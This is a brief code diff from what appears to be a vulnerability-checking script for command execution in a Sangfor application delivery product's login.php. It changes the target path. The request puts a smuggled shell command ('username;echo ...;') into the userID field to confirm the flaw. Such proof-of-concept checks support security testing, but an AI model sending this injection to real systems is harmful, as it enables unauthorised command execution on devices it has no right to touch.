@@ -20,7 +20,7 @@ class sangfor_ad_script_command_exec_BaseVerify():
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
-        payload = ":85/report/script/login.php"
+        payload = "/report/script/login.php"
         vulnurl = self.url + payload
         post_data = {
             "userID":"username;echo 81dc9bdb52d04dc20036dbd8313ed055;",
